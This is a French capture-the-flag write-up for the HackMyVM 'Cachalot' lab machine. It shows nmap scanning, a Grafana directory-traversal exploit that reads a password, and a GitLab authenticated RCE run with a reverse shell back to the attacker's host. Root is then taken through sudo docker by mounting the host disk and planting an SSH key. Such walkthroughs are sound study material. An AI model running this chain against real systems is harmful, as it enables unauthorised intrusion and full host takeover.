---
title: "Solution du CTF Cachalot de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Chacalot

[Cachalot](https://hackmyvm.eu/machines/machine.php?vm=Cachalot) est un CTF intéressant créé par *mindsflee* et récupérable sur HackMyVM. Il utilise quelques idées intéressantes.

```console
$ sudo nmap -p- -T5 --script vuln -sCV 192.168.56.141
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.141
Host is up (0.0056s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.4p1: 
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
--- snip ---
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.54: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
--- snip ---
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|_      CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
| http-enum: 
|_  /manual/: Potentially interesting folder
|_http-server-header: Apache/2.4.54 (Debian)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /login/: Login page
|   /robots.txt: Robots file
|   /api/: Potentially interesting folder (401 Unauthorized)
|_  /api-docs/: Potentially interesting folder (401 Unauthorized)
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
5022/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
|       1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
|       1337DAY-ID-26468        0.0     https://vulners.com/zdt/1337DAY-ID-26468        *EXPLOIT*
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
5080/tcp open  http    nginx
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
8080/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.10)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:2.7.10: 
|       SSV:93135       10.0    https://vulners.com/seebug/SSV:93135    *EXPLOIT*
|       PACKETSTORM:143369      10.0    https://vulners.com/packetstorm/PACKETSTORM:143369      *EXPLOIT*
|       EXPLOITPACK:069C31B8DD5A351921E96252215466D8    10.0    https://vulners.com/exploitpack/EXPLOITPACK:069C31B8DD5A351921E96252215466D8    *EXPLOIT*
|       EDB-ID:42091    10.0    https://vulners.com/exploitdb/EDB-ID:42091      *EXPLOIT*
|       CVE-2016-5636   10.0    https://vulners.com/cve/CVE-2016-5636
|       1337DAY-ID-27866        10.0    https://vulners.com/zdt/1337DAY-ID-27866        *EXPLOIT*
|       CVE-2022-48565  9.8     https://vulners.com/cve/CVE-2022-48565
--- snip ---
|       CVE-2021-4189   5.3     https://vulners.com/cve/CVE-2021-4189
|       CVE-2018-20852  5.3     https://vulners.com/cve/CVE-2018-20852
|       PACKETSTORM:142756      5.0     https://vulners.com/packetstorm/PACKETSTORM:142756      *EXPLOIT*
|       CVE-2018-1000030        3.6     https://vulners.com/cve/CVE-2018-1000030
|_      SSV:96998       0.0     https://vulners.com/seebug/SSV:96998    *EXPLOIT*
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
|_<!DOCTYPE html><html lang="en"><head><title>Debug Server</title><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous"></head><body><div class="container"><div class="page-header"><h1>172.17.0.5<small>&nbsp;&nbsp;Booted: 1m 42s ago</small></h1></div><dl><dt><strong>HOME</strong></dt><dd><code>/root</code></dd><br/><dt><strong>HOSTNAME</strong></dt><dd><code>3c068420662f</code></dd><br/><dt><strong>PATH</strong></dt><dd><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></dd><br/></dl></div></body></html>
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: BaseHTTP/0.3 Python/2.7.10
| http-vuln-cve2011-3368: 
|   VULNERABLE:
|   Apache mod_proxy Reverse Proxy Security Bypass
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3368  BID:49957
|       An exposure was reported affecting the use of Apache HTTP Server in
|       reverse proxy mode. The exposure could inadvertently expose internal
|       servers to remote users who send carefully crafted requests.
|     Disclosure date: 2011-10-05
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3368
|_      https://www.securityfocus.com/bid/49957
|_http-dombased-xss: Couldn't find any DOM based XSS.
9000/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 08:00:27:3C:C9:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 574.22 seconds
```

Beaucoup de services tournent sur cette machine, mais le plus important pour ce CTF est l'appli web qui tourne sur le port 9000.

Il s'agit d'une interface web pour Docker. Ça ne permet pas d'obtenir un shell sur les containers, mais de les stopper / démarrer ou alors obtenir leur configuration (`inspect`).

![cachalot hackmyvm docker-ui](/assets/img/hackmyvm/cachalot-docker-ui.png)

En se basant sur les ports associés aux différents containers et ceux que l'on a scannés, on peut tirer ces conclusions :

- 22 : SSH, certainement host only

- 80 : Apache, certainement host only

- 3000 : Grafana, docker

- 5022 : SSH du gitlab, docker

- 5080 : HTTP du gitlab, docker

- 50443 : non accessible, normalement https du gitlab, docker

- 8080 : docker-debug, docker

- 9000 : docker-webui

`Grafana` et `Gitlab` ont eu chacun leur lot de vulnérabilités relativement récentes. Mais l'objectif devient plus clair quand on regarde les points de montage des containers.

Voici celui du container Grafana :

```json
 "Mounts": [
  {
   "Name": "",
   "Source": "/home/cachalot/srv",
   "Destination": "/srv",
   "Driver": "",
   "Mode": "",
   "RW": true
  }
 ],
```

On voit que le dossier `srv` dans le dossier de l'utilisateur `cachalot` est monté. Malheureusement, nous n'aurons pas accès à sa clé SSH ici.

En revanche les points de montage du container Gitlab font référence à des fichiers sous `srv` :

```json
 "Mounts": [
  {
   "Name": "",
   "Source": "/var/run/docker.sock",
   "Destination": "/var/run/docker.sock",
   "Driver": "",
   "Mode": "rw",
   "RW": true
  },
  {
   "Name": "",
   "Source": "/home/cachalot/srv/gitlab/config",
   "Destination": "/etc/gitlab",
   "Driver": "",
   "Mode": "rw",
   "RW": true
  },
  {
   "Name": "",
   "Source": "/home/cachalot",
   "Destination": "/root",
   "Driver": "",
   "Mode": "ro",
   "RW": false
  },
  {
   "Name": "",
   "Source": "/home/cachalot/srv/initial_root_password",
   "Destination": "/root/srv/initial_root_password",
   "Driver": "",
   "Mode": "rw",
   "RW": true
  },
```

Par conséquent, je dois pouvoir lire le fichier `initial_root_password` depuis le montage `srv` de Grafana.

J'ai pour cela utilisé cet exploit de directory traversal : [Grafana 8.3.0 - Directory Traversal and Arbitrary File Read](https://www.exploit-db.com/exploits/50581)

```console
$ python3 50581.py -H http://192.168.56.141:3000/
Read file > /srv/initial_root_password
M4st3rR00tS3cr3t0ne^1337^
```

### Cashalot

Ce mot de passe ne permet pas une connexion SSH, il s'agit du mot de passe de l'utilisateur nommé `root` sur le Gitlab.

D'ailleurs au lancement de la VM, le container Gitlab était en mauvais état, c'était bien pratique de pouvoir le relancer.

On peut aussi retrouver les informations du compte via l'API (le hostname provient des informations de `docker inspect`) :

```console
$ curl http://gitlab.cachalot.local:5080/api/v4/users/1
{"id":1,"name":"Administrator","username":"root","state":"active","avatar_url":"https://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80\u0026d=identicon","web_url":"http://gitlab.cachalot.local/root","created_at":"2022-10-09T14:51:23.429Z","bio":null,"location":null,"public_email":"","skype":"","linkedin":"","twitter":"","website_url":"","organization":null}
```

Il existe des failles Gitlab correspondant à la version du container (`11.4.7-ce.0`). Metasploit propose un module (basé sur `exiftool`, mais il ne supporte pas l'authentification.

Sur `exploit-db` on trouve un exploit qui correspond aussi à la version et gère l'authentification : [GitLab 11.4.7 - RCE (Authenticated)](https://www.exploit-db.com/exploits/49334)

L'exploit se base sur une faille SSRF et du cross protocol à ce que j'ai compris ici : [gitlab-ssrf: Demonstration of CVE-2018-19571](https://github.com/CS4239-U6/gitlab-ssrf). Les noms de fichiers correspondent d'ailleurs étrangement à notre situation.

À l'exécution cependant, j'obtiens une erreur :

```console
$ python3 gitlab_sploit.py -g http://gitlab.cachalot.local -u root -p 'M4st3rR00tS3cr3t0ne^1337^' -l 192.168.56.1 -P 55555
[+] authenticity_token: L/lLcYmThQ6O3TOFZFzPrDxejqvE+qEwZSZKZQ1s53uy6lOti6fRjXPP9mb3TikpJasUC0V1bUDH8BXwvy0gXg==
[+] Creating project with random name: project9425
Traceback (most recent call last):
  File "/tmp/gitlab_sploit.py", line 69, in <module>
    'input', {'name': 'project[namespace_id]'}).get('value')
                                                ^^^
```

Le code essaye d'extraire le `namespace_id` du code HTML, mais cette valeur n'est pas présente. En regardant le code HTML de Gitlab pour la création d'un nouveau projet, je comprends qu'un `namespace` est en fait un groupe (de projets).

J'ai donc créé un groupe puis j'ai hardcodé son ID (`2`) dans le code. Il semble qu'il y avait déjà un projet numéroté `1` mais je n'avais pas de droit dessus.

Cette fois ça marche normalement. J'avais quelques réserves, car l'exploit utilise `nc` pour le connect back et ce n'est pas dit qu'il était présent dans le container (sans ça on aurait utilisé `/dev/tcp`).

```console
$ ncat -l -p 55555 -v
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:55555
Ncat: Listening on 0.0.0.0:55555
Ncat: Connection from 192.168.56.141:57906.
id
uid=998(git) gid=998(git) groups=998(git)
pwd
/var/opt/gitlab/gitlab-rails/working
```

### Fuckalot

J'ai ensuite migré vers `reverse-ssh` et obtenu le premier flag :

```console
git@gitlab:/$ ls root/
total 28K
drwxr-xr-x 3 1001 1001 4.0K Oct  9  2022 .
drwxr-xr-x 1 root root 4.0K Oct  9  2022 ..
-rw-r--r-- 1 1001 1001  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 1001 1001 3.5K Oct  9  2022 .bashrc
-rw-r--r-- 1 1001 1001  807 Oct  9  2022 .profile
-rw-r--r-- 1 root root   33 Oct  9  2022 local.txt
drwxr-xr-x 3 root root 4.0K Oct  9  2022 srv
git@gitlab:/$ cat root/local.txt 
64675c29aaa3f6d9d7c68e53706aac5a
```

L'utilisateur peut exécuter docker de manière privilégiée :

```console
git@gitlab:/root/srv$ sudo -l
Matching Defaults entries for git on gitlab.cachalot.local:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User git may run the following commands on gitlab.cachalot.local:
    (root) NOPASSWD: /usr/bin/docker
```

L'exploitation est classique :

```
git@gitlab:/root/srv$ sudo docker images        
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
ubuntu                       18.04               71cb16d32be4        2 years ago         63.1MB
grafana/grafana-enterprise   8.3.0-ubuntu        524526155bfd        3 years ago         371MB
gitlab/gitlab-ce             11.4.7-ce.0         cf1633301167        6 years ago         1.56GB
pottava/docker-webui         latest              3344db67bbf8        8 years ago         20.8MB
whalesalad/docker-debug      latest              6fdc3b7202f0        9 years ago         41.9MB
git@gitlab:/root/srv$ sudo docker run -it -v /:/disk 71cb16d32be4
root@1fac0df0b70d:/# cd /disk/root/
root@1fac0df0b70d:/disk/root# ls
proof.txt
root@1fac0df0b70d:/disk/root# cat proof.txt 
02c157a9d76e85bfd03546fb74d0a384
```

Nous sommes donc dans le container, mais comme on a monté le disque hôte, on a le flag final. Pour obtenir un shell, on peut ajouter un `authorized_keys` au compte root puis se connecter en SSH :

```console
$ ssh -i ~/.ssh/key_no_pass root@cachalot.local
Linux cachalot 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64

root@cachalot:~# hostname
cachalot
root@cachalot:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:3c:c9:23 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.141/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 426sec preferred_lft 426sec
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5a:89:18:30 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: veth3f647de@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 82:d2:66:7c:c6:3b brd ff:ff:ff:ff:ff:ff link-netnsid 0
9: vethb362848@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether f2:ff:fa:b4:8b:e6 brd ff:ff:ff:ff:ff:ff link-netnsid 3
11: veth82be41a@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 8e:50:20:64:4e:8f brd ff:ff:ff:ff:ff:ff link-netnsid 2
13: veth2523002@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether b6:ef:c6:9e:14:e0 brd ff:ff:ff:ff:ff:ff link-netnsid 1
15: vethba16d73@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 66:c0:91:d9:d4:78 brd ff:ff:ff:ff:ff:ff link-netnsid 4
```


